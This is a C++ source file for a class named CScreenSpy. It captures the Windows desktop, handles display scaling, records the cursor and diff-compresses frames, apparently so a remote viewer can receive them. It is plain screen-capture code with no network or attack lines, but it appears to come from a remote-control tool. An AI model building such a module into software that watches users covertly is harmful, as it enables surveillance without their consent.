// ScreenSpy.cpp: implementation of the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ScreenSpy.h"
#include "Common.h"
#include <stdio.h>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CScreenSpy::CScreenSpy(ULONG ulbiBitCount)
{
	m_bAlgorithm = ALGORITHM_DIFF;
	m_ulbiBitCount = (ulbiBitCount == 16 || ulbiBitCount == 32) ? ulbiBitCount : 16;

	//::GetSystemMetrics(SM_CXSCREEN/SM_CYSCREEN)获取屏幕大小不准
	//例如当屏幕显示比例为125%时，获取到的屏幕大小需要乘以1.25才对
	DEVMODE devmode;
	memset(&devmode, 0, sizeof (devmode));	
	devmode.dmSize = sizeof(DEVMODE);
	devmode.dmDriverExtra = 0;
	BOOL Isgetdisplay = EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &devmode);
	m_ulFullWidth = devmode.dmPelsWidth;
	m_ulFullHeight = devmode.dmPelsHeight;
	int w = ::GetSystemMetrics(SM_CXSCREEN), h = ::GetSystemMetrics(SM_CYSCREEN);
	m_bZoomed = (w != m_ulFullWidth) || (h != m_ulFullHeight);
	m_wZoom = double(m_ulFullWidth) / w, m_hZoom = double(m_ulFullHeight) / h;
	printf("=> 桌面缩放比例: %.2f, %.2f\t分辨率：%d x %d\n", m_wZoom, m_hZoom, m_ulFullWidth, m_ulFullHeight);
	m_wZoom = 1.0/m_wZoom, m_hZoom = 1.0/m_hZoom;

	m_BitmapInfor_Full = new BITMAPINFO();
	memset(m_BitmapInfor_Full, 0, sizeof(BITMAPINFO));
	BITMAPINFOHEADER* BitmapInforHeader = &(m_BitmapInfor_Full->bmiHeader);
	BitmapInforHeader->biSize = sizeof(BITMAPINFOHEADER);
	BitmapInforHeader->biWidth = m_ulFullWidth; //1080
	BitmapInforHeader->biHeight = m_ulFullHeight; //1920
	BitmapInforHeader->biPlanes = 1;
	BitmapInforHeader->biBitCount = ulbiBitCount; //通常为32
	BitmapInforHeader->biCompression = BI_RGB;
	BitmapInforHeader->biSizeImage =
		((BitmapInforHeader->biWidth * BitmapInforHeader->biBitCount + 31) / 32) * 4 * BitmapInforHeader->biHeight;

	m_hDeskTopWnd = GetDesktopWindow();
	m_hFullDC = GetDC(m_hDeskTopWnd);

	m_BitmapData_Full = NULL;
	m_hFullMemDC = CreateCompatibleDC(m_hFullDC);
	m_BitmapHandle	= ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);
	::SelectObject(m_hFullMemDC, m_BitmapHandle);

	m_DiffBitmapData_Full = NULL;
	m_hDiffMemDC	= CreateCompatibleDC(m_hFullDC); 
	m_DiffBitmapHandle	= ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, DIB_RGB_COLORS, &m_DiffBitmapData_Full, NULL, NULL);
	::SelectObject(m_hDiffMemDC, m_DiffBitmapHandle);

	m_RectBufferOffset = 0;
	m_RectBuffer = new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage * 2];
}


CScreenSpy::~CScreenSpy()
{
	if (m_BitmapInfor_Full != NULL)
	{
		delete m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	ReleaseDC(m_hDeskTopWnd, m_hFullDC);

	if (m_hFullMemDC!=NULL)
	{
		DeleteDC(m_hFullMemDC);

		::DeleteObject(m_BitmapHandle);
		if (m_BitmapData_Full!=NULL)
		{
			m_BitmapData_Full = NULL;
		}

		m_hFullMemDC = NULL;
	}

	if (m_hDiffMemDC!=NULL)
	{
		DeleteDC(m_hDiffMemDC);

		::DeleteObject(m_DiffBitmapHandle);
		if (m_DiffBitmapData_Full!=NULL)
		{
			m_DiffBitmapData_Full = NULL;
		}
	}

	if (m_RectBuffer)
	{
		delete[] m_RectBuffer;
		m_RectBuffer = NULL;
	}

	m_RectBufferOffset = 0;
}

LPVOID CScreenSpy::GetFirstScreenData()
{
	//用于从原设备中复制位图到目标设备
	::BitBlt(m_hFullMemDC, 0, 0, m_ulFullWidth, m_ulFullHeight, m_hFullDC, 0, 0, SRCCOPY);

	return m_BitmapData_Full;  //内存
}

// 算法+光标位置+光标类型
LPVOID CScreenSpy::GetNextScreenData(ULONG* ulNextSendLength)
{
	// 重置rect缓冲区指针
	m_RectBufferOffset = 0;  

	// 写入使用了哪种算法
	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));

	// 写入光标位置
	POINT	CursorPos;
	GetCursorPos(&CursorPos);
	CursorPos.x /= m_wZoom;
	CursorPos.y /= m_hZoom;
	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));

	// 写入当前光标类型
	static CCursorInfo m_CursorInfor;
	BYTE	bCursorIndex = m_CursorInfor.getCurrentCursorIndex();
	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));

	// 差异比较算法
	if (m_bAlgorithm == ALGORITHM_DIFF)
	{
		// 分段扫描全屏幕  将新的位图放入到m_hDiffMemDC中
		ScanScreen(m_hDiffMemDC, m_hFullDC, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);

		//两个Bit进行比较如果不一样修改m_lpvFullBits中的返回
		*ulNextSendLength = m_RectBufferOffset + CompareBitmap((LPBYTE)m_DiffBitmapData_Full, (LPBYTE)m_BitmapData_Full, 
			m_RectBuffer + m_RectBufferOffset, m_BitmapInfor_Full->bmiHeader.biSizeImage);

		return m_RectBuffer;
	}

	return NULL;
}


VOID CScreenSpy::ScanScreen(HDC hdcDest, HDC hdcSour, ULONG ulWidth, ULONG ulHeight)
{
	AUTO_TICK(70);
#if COPY_ALL
	BitBlt(hdcDest, 0, 0, ulWidth, ulHeight, hdcSour, 0, 0, SRCCOPY);
#else
	const ULONG	ulJumpLine = 50;
	const ULONG	ulJumpSleep = ulJumpLine / 10; 

	for (int i = 0, ulToJump = 0; i < ulHeight; i += ulToJump)
	{
		ULONG  ulv1 = ulHeight - i;  

		if (ulv1 > ulJumpLine)  
			ulToJump = ulJumpLine; 
		else
			ulToJump = ulv1;
		BitBlt(hdcDest, 0, i, ulWidth, ulToJump, hdcSour,0, i, SRCCOPY);
		Sleep(ulJumpSleep);
	}
#endif
}


ULONG CScreenSpy::CompareBitmap(LPBYTE CompareSourData, LPBYTE CompareDestData, LPBYTE szBuffer, DWORD ulCompareLength)
{
	AUTO_TICK(20);
	// Windows规定一个扫描行所占的字节数必须是4的倍数, 所以用DWORD比较
	LPDWORD	p1 = (LPDWORD)CompareDestData, p2 = (LPDWORD)CompareSourData;
	// 偏移的偏移，不同长度的偏移
	ULONG ulszBufferOffset = 0, ulv1 = 0, ulv2 = 0, ulCount = 0;
	for (int i = 0; i < ulCompareLength; i += 4, ++p1, ++p2)
	{
		if (*p1 == *p2)
			continue;

		*(LPDWORD)(szBuffer + ulszBufferOffset) = i;
		// 记录数据大小的存放位置
		ulv1 = ulszBufferOffset + sizeof(int);
		ulv2 = ulv1 + sizeof(int);
		ulCount = 0; // 数据计数器归零

		// 更新Dest中的数据
		*p1 = *p2;
		*(LPDWORD)(szBuffer + ulv2 + ulCount) = *p2;

		ulCount += 4;
		i += 4, p1++, p2++;	
		for (int j = i; j < ulCompareLength; j += 4, i += 4, ++p1, ++p2)
		{
			if (*p1 == *p2)
				break;
			// 更新Dest中的数据
			*p1 = *p2;
			*(LPDWORD)(szBuffer + ulv2 + ulCount) = *p2;
			ulCount += 4;
		}
		// 写入数据长度
		*(LPDWORD)(szBuffer + ulv1) = ulCount;
		ulszBufferOffset = ulv2 + ulCount;
	}

	return ulszBufferOffset;
}
